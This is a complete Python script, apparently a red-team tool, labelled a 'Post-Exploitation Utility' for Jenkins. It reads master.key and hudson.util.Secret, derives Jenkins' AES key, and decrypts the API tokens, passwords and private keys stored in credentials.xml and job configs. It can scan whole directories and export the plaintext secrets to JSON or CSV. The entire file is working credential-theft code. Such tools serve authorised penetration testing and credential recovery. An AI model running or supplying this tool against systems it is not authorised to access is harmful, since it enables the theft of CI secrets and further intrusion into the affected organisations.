#!/usr/bin/env python3
import os
import sys
import subprocess
from pathlib import Path

# --- Auto Virtualenv Bootstrapping ---
def bootstrap_virtualenv():
    venv_path = Path(__file__).resolve().parent / ".venv"
    
    if sys.platform == "win32":
        python_bin = venv_path / "Scripts" / "python.exe"
    else:
        python_bin = venv_path / "bin" / "python"
    
    if not os.environ.get("INSIDE_VENV") and sys.executable != str(python_bin):
        if not python_bin.exists():
            print("[*] Setting up virtualenv...", file=sys.stderr)
            try:
                subprocess.check_call([sys.executable, "-m", "venv", str(venv_path)], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                print("[!] Virtualenv creation failed. Attempting to continue without venv...", file=sys.stderr)
                print("[!] Installing pycryptodome globally (may require sudo/admin)", file=sys.stderr)
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "-q", "--user"])
                except:
                    print("[-] Failed to install pycryptodome. Please install manually: pip install pycryptodome", file=sys.stderr)
                    sys.exit(1)
                return
        
        try:
            subprocess.check_call([str(python_bin), "-m", "pip", "install", "--upgrade", "pip", "pycryptodome", "-q"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        env = os.environ.copy()
        env["INSIDE_VENV"] = "1"
        # Use absolute resolved path for __file__ to avoid path issues
        script_path = str(Path(__file__).resolve())
        result = subprocess.run([str(python_bin), script_path] + sys.argv[1:], env=env)
        sys.exit(result.returncode)

bootstrap_virtualenv()

# --- Jenkins Decryption Logic ---
import re
import base64
import argparse
from hashlib import sha256
from Crypto.Cipher import AES

# Fields in Jenkins XML likely to contain encrypted secrets
secret_title_list = [
    'apiToken', 'password', 'privateKey', 'passphrase',
    'secret', 'secretId', 'value', 'defaultValue'
]

# Magic byte marker used to validate decrypted output
decryption_magic = b'::::MAGIC::::'

def scan_directory_recursive(base_path):
    """Recursively scan directory for Jenkins credential files"""
    base_path = Path(base_path)
    found_files = []
    
    if not base_path.exists():
        return found_files
    
    for xml_file in base_path.rglob("*.xml"):
        if xml_file.name in ["credentials.xml", "config.xml"] or "/jobs/" in str(xml_file):
            found_files.append(xml_file)
    
    return found_files

def parse_arguments():
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(
        description="Jenkins Credential Decryptor - Red Team Post-Exploitation Utility",
        epilog="Example: python3 decrypt.py --path /var/lib/jenkins --export-json secrets.json",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("--path", type=str, metavar="PATH",
                        help="Jenkins base directory (auto-detects master.key, hudson.util.Secret, credentials.xml)")
    
    parser.add_argument("--key", type=str, metavar="FILE",
                        help="Path to master.key file")
    
    parser.add_argument("--secret", type=str, metavar="FILE",
                        help="Path to hudson.util.Secret file")
    
    parser.add_argument("--xml", type=str, metavar="FILE",
                        help="Path to credentials.xml file")
    
    parser.add_argument("--scan-dir", type=str, metavar="DIR",
                        help="Recursively scan directory for all credential XMLs")
    
    parser.add_argument("--interactive", action="store_true",
                        help="Enter interactive mode (decrypt individual secrets)")
    
    parser.add_argument("--export-json", type=str, metavar="FILE",
                        help="Export decrypted secrets to JSON file")
    
    parser.add_argument("--export-csv", type=str, metavar="FILE",
                        help="Export decrypted secrets to CSV file")
    
    parser.add_argument("--dry-run", action="store_true",
                        help="Simulate decryption without printing secrets")
    
    parser.add_argument("--reveal-secrets", action="store_true",
                        help="Show plaintext secrets (default: redacted)")
    
    parser.add_argument("--force", action="store_true",
                        help="Overwrite output files without warning")
    
    return parser.parse_args()

def get_confidentiality_key(master_key_path, hudson_secret_path):
    """Load and return Jenkins confidentiality key from master.key and hudson.util.Secret"""
    master_key_path = Path(master_key_path)
    hudson_secret_path = Path(hudson_secret_path)
    
    with open(master_key_path, 'r') as f:
        master_key = f.read().encode('utf-8')
    with open(hudson_secret_path, 'rb') as f:
        hudson_secret = f.read()
    
    if len(master_key) % 2 != 0 and master_key[-1:] == b'\n':
        master_key = master_key[:-1]
    if len(hudson_secret) % 2 != 0 and hudson_secret[-1:] == b'\n':
        hudson_secret = hudson_secret[:-1]
    
    return decrypt_confidentiality_key(master_key, hudson_secret)

# Decrypt the AES confidentiality key used by Jenkins to encrypt secrets
def decrypt_confidentiality_key(master_key, hudson_secret):
    derived_master_key = sha256(master_key).digest()[:16]  # AES-128 key
    cipher_handler = AES.new(derived_master_key, AES.MODE_ECB)
    decrypted_hudson_secret = cipher_handler.decrypt(hudson_secret)
    if decryption_magic not in decrypted_hudson_secret:
        return None
    return decrypted_hudson_secret[:16]

# Decrypt secrets using the old AES-ECB format
def decrypt_secret_old_format(encrypted_secret, confidentiality_key):
    cipher_handler = AES.new(confidentiality_key, AES.MODE_ECB)
    decrypted_secret = cipher_handler.decrypt(encrypted_secret)
    if not decryption_magic in decrypted_secret:
        return None
    return decrypted_secret.split(decryption_magic)[0]

# Decrypt secrets using the new AES-CBC format
def decrypt_secret_new_format(encrypted_secret, confidentiality_key):
    iv = encrypted_secret[9:9+16]
    cipher_handler = AES.new(confidentiality_key, AES.MODE_CBC, iv)
    decrypted_secret = cipher_handler.decrypt(encrypted_secret[9+16:])
    padding_value = decrypted_secret[-1]
    if padding_value > 16:
        return decrypted_secret
    return decrypted_secret[:-padding_value]

# Decrypt a base64-encoded Jenkins secret
def decrypt_secret(encoded_secret, confidentiality_key):
    if encoded_secret is None:
        return None
    try:
        encrypted_secret = base64.b64decode(encoded_secret)
    except base64.binascii.Error as error:
        print('Base64 decode failed:', error)
        return None
    if encrypted_secret[0] == 1:
        return decrypt_secret_new_format(encrypted_secret, confidentiality_key)
    else:
        return decrypt_secret_old_format(encrypted_secret, confidentiality_key)

def redact_secret(secret_text):
    """Redact secrets for safe display"""
    if len(secret_text) <= 8:
        return "***REDACTED***"
    return secret_text[:4] + "***REDACTED***" + secret_text[-4:]

def is_sensitive_credential(secret_text):
    """Check if a secret appears to be sensitive"""
    sensitive_patterns = [
        r'AKIA[0-9A-Z]{16}',
        r'(?i)secret',
        r'(?i)password',
        r'(?i)token',
        r'-----BEGIN',
        r'ghp_[a-zA-Z0-9]{36}',
    ]
    
    for pattern in sensitive_patterns:
        if re.search(pattern, secret_text):
            return True
    return False

def decrypt_credentials_file(credentials_file, confidentiality_key, reveal_secrets=False, dry_run=False):
    """Decrypt all secrets found in a Jenkins credentials.xml file"""
    credentials_file = Path(credentials_file)
    
    with open(credentials_file, 'r', encoding='utf-8', errors='ignore') as f:
        data = f.read()
    
    secrets = []
    found_encrypted = []
    
    for secret_title in secret_title_list:
        found_encrypted += re.findall(secret_title + r'>\{?(.*?)\}?<\/' + secret_title, data)
    found_encrypted += re.findall(r'>{([a-zA-Z0-9=+/]{20,})}<\/', data)
    
    found_encrypted = list(set(found_encrypted))
    
    for encrypted in found_encrypted:
        try:
            decrypted_secret = decrypt_secret(encrypted, confidentiality_key)
            if decrypted_secret and decrypted_secret != b'':
                decrypted_text = decrypted_secret.decode('utf-8', errors='ignore')
                
                if dry_run:
                    secrets.append({
                        'file': str(credentials_file),
                        'encrypted': encrypted[:20] + "...",
                        'decrypted': "[DRY RUN - NOT DECRYPTED]"
                    })
                    print("[DRY RUN] Found secret (not decrypted)")
                else:
                    display_text = decrypted_text if reveal_secrets else redact_secret(decrypted_text)
                    
                    if not reveal_secrets and is_sensitive_credential(decrypted_text):
                        display_text = "***REDACTED***"
                    
                    secrets.append({
                        'file': str(credentials_file),
                        'encrypted': encrypted[:20] + "...",
                        'decrypted': decrypted_text,
                        'display': display_text
                    })
                    
                    print(display_text)
        except Exception as e:
            pass
    
    return secrets

def run_interactive_mode(confidentiality_key, reveal_secrets=False):
    """Prompt user for secrets and decrypt them interactively"""
    print("[*] Interactive mode - Enter encrypted secrets (Ctrl+C to exit)")
    
    while True:
        try:
            secret = input('Encrypted secret: ').strip()
            if not secret:
                continue
            
            decrypted_secret = decrypt_secret(secret, confidentiality_key)
            if decrypted_secret:
                decrypted_text = decrypted_secret.decode('utf-8', errors='ignore')
                
                if reveal_secrets:
                    print(f"[+] Decrypted: {decrypted_text}")
                else:
                    display_text = redact_secret(decrypted_text)
                    if is_sensitive_credential(decrypted_text):
                        display_text = "***REDACTED***"
                    print(f"[+] Decrypted: {display_text}")
                    print("[!] Use --reveal-secrets to show plaintext")
            else:
                print("[-] Decryption failed")
        except KeyboardInterrupt:
            print("\n[*] Exiting interactive mode")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

def check_elevated_privileges():
    """Warn if running with elevated privileges unnecessarily"""
    if sys.platform == "win32":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] WARNING: Running with elevated privileges (Administrator)")
                print("[!] This tool does not require elevated privileges")
        except:
            pass
    else:
        if os.geteuid() == 0:
            print("[!] WARNING: Running as root")
            print("[!] This tool does not require root privileges")

def main():
    """Main entry point"""
    check_elevated_privileges()
    
    args = parse_arguments()
    
    master_key_file = None
    hudson_secret_file = None
    credentials_files = []
    all_secrets = []
    
    if args.path:
        base_path = Path(args.path)
        master_key_file = base_path / "secrets" / "master.key"
        hudson_secret_file = base_path / "secrets" / "hudson.util.Secret"
        
        cred_file = base_path / "credentials.xml"
        if cred_file.exists():
            credentials_files.append(cred_file)
    
    if args.key:
        master_key_file = Path(args.key)
    
    if args.secret:
        hudson_secret_file = Path(args.secret)
    
    if args.xml:
        credentials_files.append(Path(args.xml))
    
    if args.scan_dir:
        print(f"[*] Scanning {args.scan_dir} recursively...")
        found = scan_directory_recursive(args.scan_dir)
        credentials_files.extend(found)
        print(f"[+] Found {len(found)} credential files")
    
    if not master_key_file or not hudson_secret_file:
        print("[-] Error: Must specify --path, or both --key and --secret")
        sys.exit(1)
    
    if not master_key_file.exists():
        print(f"[-] Error: master.key not found at {master_key_file}")
        sys.exit(1)
    
    if not hudson_secret_file.exists():
        print(f"[-] Error: hudson.util.Secret not found at {hudson_secret_file}")
        sys.exit(1)
    
    print(f"[*] Loading confidentiality key...")
    confidentiality_key = get_confidentiality_key(master_key_file, hudson_secret_file)
    
    if not confidentiality_key:
        print('[-] Failed to decrypt confidentiality key')
        sys.exit(1)
    
    print("[+] Confidentiality key loaded successfully")
    
    if args.interactive:
        run_interactive_mode(confidentiality_key, args.reveal_secrets)
        return
    
    if credentials_files:
        for cred_file in credentials_files:
            print(f"\n[*] Processing {cred_file}")
            try:
                secrets = decrypt_credentials_file(
                    cred_file, 
                    confidentiality_key,
                    reveal_secrets=args.reveal_secrets,
                    dry_run=args.dry_run
                )
                all_secrets.extend(secrets)
                print(f"[+] Found {len(secrets)} secrets in {cred_file}")
            except Exception as e:
                print(f"[-] Error processing {cred_file}: {e}")
    
    if args.export_json and all_secrets:
        export_path = Path(args.export_json)
        
        if export_path.exists() and not args.force:
            print(f"[-] Error: {export_path} already exists. Use --force to overwrite")
            sys.exit(1)
        
        export_path.parent.mkdir(parents=True, exist_ok=True)
        
        import json
        with open(export_path, 'w') as f:
            json.dump(all_secrets, f, indent=2)
        
        print(f"[+] Exported {len(all_secrets)} secrets to {export_path}")
    
    if args.export_csv and all_secrets:
        export_path = Path(args.export_csv)
        
        if export_path.exists() and not args.force:
            print(f"[-] Error: {export_path} already exists. Use --force to overwrite")
            sys.exit(1)
        
        export_path.parent.mkdir(parents=True, exist_ok=True)
        
        import csv
        with open(export_path, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=['file', 'encrypted', 'decrypted', 'display'])
            writer.writeheader()
            writer.writerows(all_secrets)
        
        print(f"[+] Exported {len(all_secrets)} secrets to {export_path}")
    
    if not args.reveal_secrets and all_secrets and not args.dry_run:
        print("\n[!] Secrets are redacted by default. Use --reveal-secrets to show plaintext")

if __name__ == "__main__":
    main()
